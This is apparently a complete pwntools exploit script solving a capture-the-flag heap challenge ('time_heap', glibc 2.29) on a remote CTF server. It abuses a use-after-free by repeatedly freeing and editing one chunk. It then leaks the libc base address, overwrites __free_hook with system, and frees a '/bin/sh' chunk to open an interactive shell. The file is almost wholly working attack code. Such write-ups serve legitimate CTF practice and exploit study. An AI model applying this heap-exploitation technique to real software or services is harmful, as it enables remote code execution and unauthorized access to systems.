import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='time_heap'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.29")
pdbg.remote('nc.eonew.cn',10015)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('./libc-2.29.so')
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,c,d):
			io.sendlineafter('Your choice: ','1')
			io.sendlineafter('Size: ',str(a))
			io.sendafter('Content: ',c)
			io.sendafter('Remark: ',c)

		def delete(a):
			io.sendlineafter('Your choice: ','2')
			io.sendlineafter('Index: ',str(a))

		def edit(a,c,d):
			io.sendlineafter('Your choice: ','3')
			io.sendlineafter('Index: ',str(a))
			io.sendafter('Content: ',c)
			io.sendafter('Remark: ',d)

		def show(a):
			io.sendlineafter('Your choice: ','4')
			io.sendlineafter('Index: ',str(a))
		


		add(0x88,'aaa','aaa')
		delete(0)
		edit(0,'\x00'*0x10,'\x00')
		delete(0)
		edit(0,'\x00'*0x10,'\x00')
		delete(0)
		edit(0,'\x00'*0x10,'\x00')
		delete(0)
		edit(0,'\x00'*0x10,'\x00')
		delete(0)
		edit(0,'\x00'*0x10,'\x00')
		delete(0)
		edit(0,'\x00'*0x10,'\x00')
		delete(0)
		edit(0,'\x00'*0x10,'\x00')
		delete(0)
		show(0)
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		edit(0,p64(libc.sym['__free_hook']),'\x00')
		add(0x88,p64(system_addr),p64(system_addr))
		edit(0,'/bin/sh\x00','\x00')
		delete(0)
		success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue